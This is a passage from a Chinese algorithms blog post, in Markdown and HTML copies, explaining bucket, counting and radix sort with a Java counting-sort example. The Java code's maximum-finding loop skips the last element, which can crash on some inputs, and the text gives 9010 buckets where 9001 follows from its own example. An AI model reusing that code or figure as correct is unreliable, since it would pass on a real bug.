%}\n\n桶排序的时间复杂度为什么是O(n)呢？我们一块儿来分析一下。\n\n如果要排序的数据有n个，我们把他们均匀的划分到m个桶内，每个桶里就有k=n/m个元素。每个桶内部使用快速排序，时间复杂度是$O(k\\*logk)$。m个桶排序的时间复杂度就是$O(m\\*k\\*logk)$，因为k=n/m，所以整个桶排序的时间复杂度就是$O(n\\*log\\frac{n}{m})$，当桶的个数m非常接近个数n时，$log\\frac{n}{m}$就是一个非常小的常量，这个时候桶排序的时间复杂度就接近O(n)。\n\n**桶排序看起来很优秀，那它是不是可以代替前面我们所说的排序算法呢？**\n\n答案是否定的，为了让你理解桶排序的原理，上面我们做了很多假设。实际上桶排序对数据的要求是非常苛刻的。\n\n首先，要排序的数据天然的就能划分成m个桶，并且桶与桶之间有着天然的大小顺序，这样每个桶内的数据都排序之后，桶与桶之间数据不需要再排序了。\n\n其次，数据在各个桶之间的分布是非常均匀的。如果数据经过桶的划分之后，有的桶里的数据非常多，有些非常少，很不均匀，那桶内数据排序的时间复杂度就不是常量级了。在极端情况下，如果数据都被划分到了一个桶里，那就退化为了$O(n\\*logN)$的排序算法了。\n\n**桶排序比较适合用在外部排序中**，外部排序是指数据存储在外部磁盘中，数据量比较大，内存有限，无法将数据全部加载到内存中。\n\n比如我们又10GB的订单数据，我们希望按照订单金额（假设金额都是正整数）进行排序，但是我们的内存有限，只有几百MB，没办法一次性把10GB数据全部加载到内存中。这个时候我们怎么办呢？\n\n现在我来讲一下，如何借助桶排序的处理思想来解决这个问题。\n\n我们可以先扫描一遍文件，看订单金额所处的数据范围。假设经过扫描之后我们得到，订单金额最小的是1元，最大是10万元。我们将所有订单根据金额划分到100个桶里，第一个桶存储1-1000元之间的订单，第二个桶存储1001-2000之间的订单，以此类推。每一个桶对应一个文件，并且按照金额范围大小顺序编号命名（00, 01, 02, 03 ... 99）。\n\n理想情况下，如果订单金额在1-10万之间均匀分布，那订单会被均匀划分到100个文件中，每个小文件存储大约100MB的内容，我们就可以将这100个小文件依次读取到内存中进行排序。等所有文件都排序号之后，我们只需要按照订单编号，从小到大依次读取每个小文件中的订单数据，并将其写入到一个文件中，那这个文件中存储的就是按照金额从小到大的订单数据了。\n\n不过，你可能也发现了，订单金额在1元到10万元之间并不一定是均匀分布的，所以10GB订单数据是无法均匀的划分到100个文件中的。有可能某个金额区间的数据特别多，划分之后对应的文件就会特别大，没法一次性读入内存，这时候该怎么办呢？\n\n针对这些划分之后还是比较大的文件，我们可以继续划分，比如，订单金额在1-1000之间的比较多，我们可以将这个区间再划分为10个小区间，1元到100元，101元到200元，201元到300元......901到1000元。如果划分之后，101元到200元之间订单还是太多，那就在继续划分，直到所有的文件都能读入内存为止。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 计数排序\n{% endnote %}\n</div>\n\n个人觉得，**计数排序其实是桶排序的一种特殊情况**。当要排序的n个数据，所处的范围并不大时，比如最大值是k，我们可以把数据分成k个桶，每个数据桶内的数据值是相同的，这样就省去了桶内的数据排序的时间。\n\n我们都经历过高考，高考计分系统还记得吗？我们查分数的时候，会显示我们的成绩以及所在省的排名。如果你所在省的考生有50万，那如何根据成绩快速排序得出名次呢？\n\n考生的满分是900分，最低是0分，这个数据的范围很小，所以我们可以分成901个桶，对应分数从0分到900分，根据考生的成绩，我们将这50万个考生划分到这901个桶内，桶内的数据都是分数相同的考生，所有并不需要排序。我们只需要依次扫描每个桶，将桶内的考生输出到一个数组中，就实现了50万考生的排序。因为只涉及扫描遍历操作，所以时间复杂度是O(n)。\n\n计数排序的算法思想就是这么简单，跟桶排序非常类似，只是桶的大小粒度不一样。**不过，为什么这个算法叫做\"计数\"排序呢？\"计数\"的含义来自哪里？**\n\n想弄明白这个问题，我们就要来看计数排序算法的实现方法。我们还是拿考生那个例子，为了方便说明，我对数据规模做了简化。假设猪油8个考生，分数在0-5之间，这8个考生的成绩存放在一个数组A[8]中，他们分别是2,5,3,0,2,3,0,3。\n\n考生的成绩从0分到5分，我们使用大小为6个数组C[6]表示桶，其中下标对应考生个数。像我们刚刚举得例子，我们只需要遍历以便考生分数，就可以得到C[6]的值。\n\n{% asset_img 计算排序01.jpg %}\n\n从图中可以看出，分数为3分的考生有3个，小于3分的考生有4个，所以，成绩为3的考生在排序之后的有序数组R[8]中，会保存下标4,5,6的位置。\n\n{% asset_img 计数排序02.jpg %}\n\n那如何快速计算出，每个分数的考生在有序数组中对应的存储位置呢？这个处理方法很巧妙，很不容易想到。\n\n思路是这样的：我们对C[6]数组顺序求和，C[6]数组就变成了下面这个样子。C[k]里存储的就是小于等于分数k的考生个数。\n\n{% asset_img 计数排序03.jpg %}\n\n有了前面的数据准备之后，现在就要讲解计数排序中最复杂、最难理解的一部分了。\n\n我们从后向前依次扫描数组A。比如，当扫描到3时，我们可以从数组C中取出下标为3的值7，也就是说，到目前为止，包括自己在内，分数小于等于3的考生有7个，也就是说3是数组R中第7个元素（也就是R[6]的位置）。当3放入数组R中后，小于等于3的元素就剩下了6个了，所以对应的C[6]也要减一，变成6。\n\n以此类推，当我们扫描到第二个分数为3的考生的时候，就会把它放入数组R中的第6个元素的位置(也就是下标为5的位置)。当我们扫描完数组A后，数组R内的数据就是按照分数从小到大有序排列的了。\n\n{% asset_img 计数排序04.jpg %}\n\n上面的过程有点复杂，我将其写成代码如下，你可以对照看下。\n\n```java\npublic class CountSort {\n    public static void main(String[] args) {\n        int[] a = new int[] {5,4,2,6,2,3,5,1,4,8,5,9,6,7,8,10,3,4,2,0}; // 20个人的成绩进行计数排序\n        System.out.println(\"计数排序前：\"+Arrays.toString(a));\n        countSort(a);\n        System.out.println(\"计数排序后：\"+Arrays.toString(a));\n    }\n    private static void countSort(int[] a) {\n        int n = a.length;\n        /* 创建桶数组C */\n        // 1、查找原数组的数据范围（必须是正整数）\n        int max = a[0];\n        for (int i = 0; i<a.length-1;i++){\n            if (a[i]>max){\n                max = a[i];\n            }\n        }\n        // 2、根据数据范围创建桶数组\n        int[] C = new int[max+1];\n        // 2.1、扫描原数组，将数据的个数放入桶C中\n        for (int anA : a) {\n            C[anA]++;\n        }\n        // 2.2、将C数组中的数据依次累加\n        for (int i=1;i<=max;i++){\n            C[i] = C[i-1] + C[i];\n        }\n        // 3、根据C桶中的计数将原数组a中的数据依次放入A数组中\n        // 3.1、创建临时数组A\n        int[] A = new int[n];\n        // 3.2、从后向前扫描a，并根据C放入A\n        for (int i = n-1; i>=0; i--){\n            A[C[a[i]]-1] = a[i];\n            C[a[i]]--;\n        }\n        // 4、拷贝数组A到原数组a\n        System.arraycopy(A, 0, a, 0, n);\n    }\n}\n```\n\n这种利用另外一个数组来计数的实现方式是不是非常巧妙呢？这也是这种排序算法加计数排序的原因。不过，你千万不要死记硬背上面的排序过程，重要的是理解和应用。\n\n总结一下，**计数排序只能用在数据范围不大的场合，如果数据范围k比要排序的数据n大很多，就不适合用计数排序了。而且，计数排序只能给非负整数排序，如果要排序的数据是其他类型的，要将其在不改变相对大小的情况下，转化为非负整数。**\n\n比如，还是拿考生这个例子。如果考生的成绩精确到小数后一位，我们就需要将所有的分数乘以10，转化为整数。然后在放入到9010个桶中。再比如，如果要排序的数据中有负数，数据范围是[-1000,1000]，那我们就需要对每个数据先加1000，转化为非负整数。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 基数排序\n{% endnote %}\n</div>\n\n我们再来看这样一个问题。假如我们有10万个手机号码，希望将这10万个手机号码从小到大排序，你有什么比较快速的排序方法？\n\n我们之前讲的快排，时间复杂度可以做到$O(nlogN)$，还有更高效的排序算法吗？桶排序、计数排序能排上用场吗？手机号有11位，范围很大，显然不适合用这两种算法。针对这个排序问题，有没有时间复杂度是O(n)的排序算法呢？下面我们就来看一种新的排序算法：基数排序。\n\n刚刚这个问题有这样的规律：如果比较的两个手机号a、b，前面的几位中，a手机号码已经比b大了，那后面的几位就不用比较了。\n\n借助稳定排序算法，这里有一个巧妙的实现思路。还记得在排序第一节中，我们讲到排序算法的稳定性时提到的订单的例子吗？我们这里也可以借助相同的处理思路，先按照最后一位来排序手机号，然后，再利用稳定排序算法按照倒数第二位来重新排序，以此类推，最后按照第一位重新排序，经过11次排序之后，手机号就有序了。\n\n手机号码稍微有点长，画图不容易看清楚，我这里用三位数进行排序的例子，画了一张基数排序的过程分解图，你可以看下：\n\n{% asset_img 基数排序01.jpg %}\n\n注意，这里按照每位进行排序的排序算法必须是稳定的，否则这个实现思路就是不正确的。因为如果是非稳定排序，那最后一次排序只会考虑最高位的大小顺序，完全不会管其他位的大小关系，那么低位的排序就完全没有意义了。\n\n根据每一位来排序，我们可以用刚刚讲过的桶排序或者计数排序，他们的时间复杂度可以做到O(n)，如果要排序的数据有k位，那我们就要k次桶排序或者计数排序，总的时间复杂度是O(k\\*n)。当k不大的时候，比如手机号排序的例子，k最大就是11，所以基数排序的时间复杂度近似于O(n)。\n\n实际上，有时候要排序的数据并不都是等长的，比如我们排序牛津字典中的20万个英文单词，最短的只有一个字母，最长的大概有45个字母，那么对于这种不等长的数据，基数排序还适用吗？\n\n实际上，**我们可以把所有的单词补齐到相同的长度，位数不够的可以在后面补“0”**，因为根据ASCII表，所有的字母值都大于“0”，所以补“0”并不会影响到原有的大小顺序，这样就可以继续基数排序了。\n\n总结一下，**基数排序对于要排序的数据是有要求的，需要可以分割出独立的“位”来比较，而且位之间有递进的关系，如果a数据的高位比b数据大，那剩下的位就不需要比较了，除此之外，每一位的数据范围不能太大，要可以用线性排序来排序，否则，基数排序的时间复杂度就不可能做到O(n)**。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n今天的内容学完了，我们在回过头来看开篇的问题：如何按照年龄给100万用户排序？现在是不是问题变得简单了。\n\n实际上，根据年龄给100万用户排序，就类似按照成绩给50万用户排序。我们假设年龄的范围最小1岁，最大不超过120岁，我们可以遍历这100万用户，根据年龄将其放入这120个桶中，然后依次遍历这120个桶中的元素，这样就得到了按照年龄排序的100万用户数据。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天，我们学习了三种线性时间复杂度的排序算法，有桶排序、计数排序、基数排序。他们对要排序的数据有非常严格的要求，应用不是很广泛，但是如果数据特征符合这些排序算法的要求，应用这些算法，会非常高效，线性时间复杂度可以达到O(n)。\n\n桶排序和计数排序非常相似，都是针对数据范围不大的数据，将数据划分成不同的桶来实现排序。基数排序要求数据可以排成高低位，高位相同在比较低位。而且每一位的数据范围都不能太大，因为基数排序算法需要借助桶排序或计数排序实现每一位的排序工作。\n\n### 课后思考\n\n我们今天讲的都是针对特殊数据的排序算法。实际上，还有很多看似是排序但又不需要使用排序算法就能处理的排序问题。\n\n假设我们现在需要对D,a,F,B,c,A,z这个字符串进行排序，要求将其中所有的小写字母都排在大写字母的前面，但小写字母内部和大写字母内部不要求有序。比如经过排序之后为a,c,z,D,F,B,A，这个如何来实现呢？如果字符串中存储的不仅有大小写字母，还有数字，要将小写字母放到前面，大写字母放到最后，数字放到中间，不用排序算法，又该怎么解决呢？\n\nhttps://219.143.144.206:1443/relogin.html?ReloginCause=3&LangMode=2&UserID=&RandomID=&CsrfTk=VB3JXD3J2IUAZFXDYE3J&\n\n\n\n<br>\n<br>\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-排序(下)","published":1,"updated":"2019-06-26T03:52:03.517Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2nm006do25tawl2fyja","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>上一节着重分析了几种常用排序算法的原理、时间复杂度、空间复杂度、稳定性等。今天会接触三种时间复杂度为O(n)的排序算法：桶排序、基数排序、计数排序。因为这些排序算法的时间复杂度是线性的，所以把这类排序算法叫做线性排序。之所以能做到线性的时间复杂度，是因为这三种算法是基于非比较的排序算法，都不涉及元素之间的比较操作。</p>\n<p>这几种算法理解起来都不难，时间、空间复杂度分析起来也很简单，但是对要排序的数据要求很苛刻，所以今天要<strong>学习的重点是掌握这些排序算法的适用场景</strong>。</p>\n<p>按照惯例，我先给出一道思考题：<font color=\"red\"><strong>如何根据年龄给100万用户排序？</strong></font>，你可能会说，我用上一节讲的归并、快排就可以搞定啊！是的，他们也可以完成功能，但是时间复杂度最低也是$O(n*logN)$。有没有更快的排序方法呢？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"桶排序\"><a href=\"#桶排序\" class=\"headerlink\" title=\"桶排序\"></a>桶排序</h3></div><br></div>\n\n<p>首先，我们来看桶排序。桶排序，顾名思义，要用到“桶”，核心思想是将要排序的数据分到几个有序的桶里，每个桶里的数据再单独排序。桶内排完序之后，再把桶里的数据按照顺序依次取出，组成的序列就是有序的了。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/桶排序原理图.jpg\">\n<p>桶排序的时间复杂度为什么是O(n)呢？我们一块儿来分析一下。</p>\n<p>如果要排序的数据有n个，我们把他们均匀的划分到m个桶内，每个桶里就有k=n/m个元素。每个桶内部使用快速排序，时间复杂度是$O(k*logk)$。m个桶排序的时间复杂度就是$O(m*k*logk)$，因为k=n/m，所以整个桶排序的时间复杂度就是$O(n*log\\frac{n}{m})$，当桶的个数m非常接近个数n时，$log\\frac{n}{m}$就是一个非常小的常量，这个时候桶排序的时间复杂度就接近O(n)。</p>\n<p><strong>桶排序看起来很优秀，那它是不是可以代替前面我们所说的排序算法呢？</strong></p>\n<p>答案是否定的，为了让你理解桶排序的原理，上面我们做了很多假设。实际上桶排序对数据的要求是非常苛刻的。</p>\n<p>首先，要排序的数据天然的就能划分成m个桶，并且桶与桶之间有着天然的大小顺序，这样每个桶内的数据都排序之后，桶与桶之间数据不需要再排序了。</p>\n<p>其次，数据在各个桶之间的分布是非常均匀的。如果数据经过桶的划分之后，有的桶里的数据非常多，有些非常少，很不均匀，那桶内数据排序的时间复杂度就不是常量级了。在极端情况下，如果数据都被划分到了一个桶里，那就退化为了$O(n*logN)$的排序算法了。</p>\n<p><strong>桶排序比较适合用在外部排序中</strong>，外部排序是指数据存储在外部磁盘中，数据量比较大，内存有限，无法将数据全部加载到内存中。</p>\n<p>比如我们又10GB的订单数据，我们希望按照订单金额（假设金额都是正整数）进行排序，但是我们的内存有限，只有几百MB，没办法一次性把10GB数据全部加载到内存中。这个时候我们怎么办呢？</p>\n<p>现在我来讲一下，如何借助桶排序的处理思想来解决这个问题。</p>\n<p>我们可以先扫描一遍文件，看订单金额所处的数据范围。假设经过扫描之后我们得到，订单金额最小的是1元，最大是10万元。我们将所有订单根据金额划分到100个桶里，第一个桶存储1-1000元之间的订单，第二个桶存储1001-2000之间的订单，以此类推。每一个桶对应一个文件，并且按照金额范围大小顺序编号命名（00, 01, 02, 03 … 99）。</p>\n<p>理想情况下，如果订单金额在1-10万之间均匀分布，那订单会被均匀划分到100个文件中，每个小文件存储大约100MB的内容，我们就可以将这100个小文件依次读取到内存中进行排序。等所有文件都排序号之后，我们只需要按照订单编号，从小到大依次读取每个小文件中的订单数据，并将其写入到一个文件中，那这个文件中存储的就是按照金额从小到大的订单数据了。</p>\n<p>不过，你可能也发现了，订单金额在1元到10万元之间并不一定是均匀分布的，所以10GB订单数据是无法均匀的划分到100个文件中的。有可能某个金额区间的数据特别多，划分之后对应的文件就会特别大，没法一次性读入内存，这时候该怎么办呢？</p>\n<p>针对这些划分之后还是比较大的文件，我们可以继续划分，比如，订单金额在1-1000之间的比较多，我们可以将这个区间再划分为10个小区间，1元到100元，101元到200元，201元到300元……901到1000元。如果划分之后，101元到200元之间订单还是太多，那就在继续划分，直到所有的文件都能读入内存为止。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"计数排序\"><a href=\"#计数排序\" class=\"headerlink\" title=\"计数排序\"></a>计数排序</h3></div><br></div>\n\n<p>个人觉得，<strong>计数排序其实是桶排序的一种特殊情况</strong>。当要排序的n个数据，所处的范围并不大时，比如最大值是k，我们可以把数据分成k个桶，每个数据桶内的数据值是相同的，这样就省去了桶内的数据排序的时间。</p>\n<p>我们都经历过高考，高考计分系统还记得吗？我们查分数的时候，会显示我们的成绩以及所在省的排名。如果你所在省的考生有50万，那如何根据成绩快速排序得出名次呢？</p>\n<p>考生的满分是900分，最低是0分，这个数据的范围很小，所以我们可以分成901个桶，对应分数从0分到900分，根据考生的成绩，我们将这50万个考生划分到这901个桶内，桶内的数据都是分数相同的考生，所有并不需要排序。我们只需要依次扫描每个桶，将桶内的考生输出到一个数组中，就实现了50万考生的排序。因为只涉及扫描遍历操作，所以时间复杂度是O(n)。</p>\n<p>计数排序的算法思想就是这么简单，跟桶排序非常类似，只是桶的大小粒度不一样。<strong>不过，为什么这个算法叫做”计数”排序呢？”计数”的含义来自哪里？</strong></p>\n<p>想弄明白这个问题，我们就要来看计数排序算法的实现方法。我们还是拿考生那个例子，为了方便说明，我对数据规模做了简化。假设猪油8个考生，分数在0-5之间，这8个考生的成绩存放在一个数组A[8]中，他们分别是2,5,3,0,2,3,0,3。</p>\n<p>考生的成绩从0分到5分，我们使用大小为6个数组C[6]表示桶，其中下标对应考生个数。像我们刚刚举得例子，我们只需要遍历以便考生分数，就可以得到C[6]的值。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计算排序01.jpg\">\n<p>从图中可以看出，分数为3分的考生有3个，小于3分的考生有4个，所以，成绩为3的考生在排序之后的有序数组R[8]中，会保存下标4,5,6的位置。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计数排序02.jpg\">\n<p>那如何快速计算出，每个分数的考生在有序数组中对应的存储位置呢？这个处理方法很巧妙，很不容易想到。</p>\n<p>思路是这样的：我们对C[6]数组顺序求和，C[6]数组就变成了下面这个样子。C[k]里存储的就是小于等于分数k的考生个数。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计数排序03.jpg\">\n<p>有了前面的数据准备之后，现在就要讲解计数排序中最复杂、最难理解的一部分了。</p>\n<p>我们从后向前依次扫描数组A。比如，当扫描到3时，我们可以从数组C中取出下标为3的值7，也就是说，到目前为止，包括自己在内，分数小于等于3的考生有7个，也就是说3是数组R中第7个元素（也就是R[6]的位置）。当3放入数组R中后，小于等于3的元素就剩下了6个了，所以对应的C[6]也要减一，变成6。</p>\n<p>以此类推，当我们扫描到第二个分数为3的考生的时候，就会把它放入数组R中的第6个元素的位置(也就是下标为5的位置)。当我们扫描完数组A后，数组R内的数据就是按照分数从小到大有序排列的了。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计数排序04.jpg\">\n<p>上面的过程有点复杂，我将其写成代码如下，你可以对照看下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CountSort</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] a = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[] &#123;<span class=\"number\">5</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">6</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">8</span>,<span class=\"number\">5</span>,<span class=\"number\">9</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">10</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>&#125;; <span class=\"comment\">// 20个人的成绩进行计数排序</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"计数排序前：\"</span>+Arrays.toString(a));</span><br><span class=\"line\">        countSort(a);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"计数排序后：\"</span>+Arrays.toString(a));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">countSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> n = a.length;</span><br><span class=\"line\">        <span class=\"comment\">/* 创建桶数组C */</span></span><br><span class=\"line\">        <span class=\"comment\">// 1、查找原数组的数据范围（必须是正整数）</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> max = a[<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i&lt;a.length-<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (a[i]&gt;max)&#123;</span><br><span class=\"line\">                max = a[i];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 2、根据数据范围创建桶数组</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] C = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[max+<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"comment\">// 2.1、扫描原数组，将数据的个数放入桶C中</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> anA : a) &#123;</span><br><span class=\"line\">            C[anA]++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 2.2、将C数组中的数据依次累加</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=max;i++)&#123;</span><br><span class=\"line\">            C[i] = C[i-<span class=\"number\">1</span>] + C[i];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 3、根据C桶中的计数将原数组a中的数据依次放入A数组中</span></span><br><span class=\"line\">        <span class=\"comment\">// 3.1、创建临时数组A</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] A = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[n];</span><br><span class=\"line\">        <span class=\"comment\">// 3.2、从后向前扫描a，并根据C放入A</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = n-<span class=\"number\">1</span>; i&gt;=<span class=\"number\">0</span>; i--)&#123;</span><br><span class=\"line\">            A[C[a[i]]-<span class=\"number\">1</span>] = a[i];</span><br><span class=\"line\">            C[a[i]]--;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 4、拷贝数组A到原数组a</span></span><br><span class=\"line\">        System.arraycopy(A, <span class=\"number\">0</span>, a, <span class=\"number\">0</span>, n);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这种利用另外一个数组来计数的实现方式是不是非常巧妙呢？这也是这种排序算法加计数排序的原因。不过，你千万不要死记硬背上面的排序过程，重要的是理解和应用。</p>\n<p>总结一下，<strong>计数排序只能用在数据范围不大的场合，如果数据范围k比要排序的数据n大很多，就不适合用计数排序了。而且，计数排序只能给非负整数排序，如果要排序的数据是其他类型的，要将其在不改变相对大小的情况下，转化为非负整数。</strong></p>\n<p>比如，还是拿考生这个例子。如果考生的成绩精确到小数后一位，我们就需要将所有的分数乘以10，转化为整数。然后在放入到9010个桶中。再比如，如果要排序的数据中有负数，数据范围是[-1000,1000]，那我们就需要对每个数据先加1000，转化为非负整数。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"基数排序\"><a href=\"#基数排序\" class=\"headerlink\" title=\"基数排序\"></a>基数排序</h3></div><br></div>\n\n<p>我们再来看这样一个问题。假如我们有10万个手机号码，希望将这10万个手机号码从小到大排序，你有什么比较快速的排序方法？</p>\n<p>我们之前讲的快排，时间复杂度可以做到$O(nlogN)$，还有更高效的排序算法吗？桶排序、计数排序能排上用场吗？手机号有11位，范围很大，显然不适合用这两种算法。针对这个排序问题，有没有时间复杂度是O(n)的排序算法呢？下面我们就来看一种新的排序算法：基数排序。</p>\n<p>刚刚这个问题有这样的规律：如果比较的两个手机号a、b，前面的几位中，a手机号码已经比b大了，那后面的几位就不用比较了。</p>\n<p>借助稳定排序算法，这里有一个巧妙的实现思路。还记得在排序第一节中，我们讲到排序算法的稳定性时提到的订单的例子吗？我们这里也可以借助相同的处理思路，先按照最后一位来排序手机号，然后，再利用稳定排序算法按照倒数第二位来重新排序，以此类推，最后按照第一位重新排序，经过11次排序之后，手机号就有序了。</p>\n<p>手机号码稍微有点长，画图不容易看清楚，我这里用三位数进行排序的例子，画了一张基数排序的过程分解图，你可以看下：</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/基数排序01.jpg\">\n<p>注意，这里按照每位进行排序的排序算法必须是稳定的，否则这个实现思路就是不正确的。因为如果是非稳定排序，那最后一次排序只会考虑最高位的大小顺序，完全不会管其他位的大小关系，那么低位的排序就完全没有意义了。</p>\n<p>根据每一位来排序，我们可以用刚刚讲过的桶排序或者计数排序，他们的时间复杂度可以做到O(n)，如果要排序的数据有k位，那我们就要k次桶排序或者计数排序，总的时间复杂度是O(k*n)。当k不大的时候，比如手机号排序的例子，k最大就是11，所以基数排序的时间复杂度近似于O(n)。</p>\n<p>实际上，有时候要排序的数据并不都是等长的，比如我们排序牛津字典中的20万个英文单词，最短的只有一个字母，最长的大概有45个字母，那么对于这种不等长的数据，基数排序还适用吗？</p>\n<p>实际上，<strong>我们可以把所有的单词补齐到相同的长度，位数不够的可以在后面补“0”</strong>，因为根据ASCII表，所有的字母值都大于“0”，所以补“0”并不会影响到原有的大小顺序，这样就可以继续基数排序了。</p>\n<p>总结一下，<strong>基数排序对于要排序的数据是有要求的，需要可以分割出独立的“位”来比较，而且位之间有递进的关系，如果a数据的高位比b数据大，那剩下的位就不需要比较了，除此之外，每一位的数据范围不能太大，要可以用线性排序来排序，否则，基数排序的时间复杂度就不可能做到O(n)</strong>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>今天的内容学完了，我们在回过头来看开篇的问题：如何按照年龄给100万用户排序？现在是不是问题变得简单了。</p>\n<p>实际上，根据年龄给100万用户排序，就类似按照成绩给50万用户排序。我们假设年龄的范围最小1岁，最大不超过120岁，我们可以遍历这100万用户，根据年龄将其放入这120个桶中，然后依次遍历这120个桶中的元素，这样就得到了按照年龄排序的100万用户数据。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天，我们学习了三种线性时间复杂度的排序算法，有桶排序、计数排序、基数排序。他们对要排序的数据有非常严格的要求，应用不是很广泛，但是如果数据特征符合这些排序算法的要求，应用这些算法，会非常高效，线性时间复杂度可以达到O(n)。</p>\n<p>桶排序和计数排序非常相似，都是针对数据范围不大的数据，将数据划分成不同的桶来实现排序。基数排序要求数据可以排成高低位，高位相同在比较低位。而且每一位的数据范围都不能太大，因为基数排序算法需要借助桶排序或计数排序实现每一位的排序工作。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>我们今天讲的都是针对特殊数据的排序算法。实际上，还有很多看似是排序但又不需要使用排序算法就能处理的排序问题。</p>\n<p>假设我们现在需要对D,a,F,B,c,A,z这个字符串进行排序，要求将其中所有的小写字母都排在大写字母的前面，但小写字母内部和大写字母内部不要求有序。比如经过排序之后为a,c,z,D,F,B,A，这个如何来实现呢？如果字符串中存储的不仅有大小写字母，还有数字，要将小写字母放到前面，大写字母放到最后，数字放到中间，不用排序算法，又该怎么解决呢？</p>\n<p><a 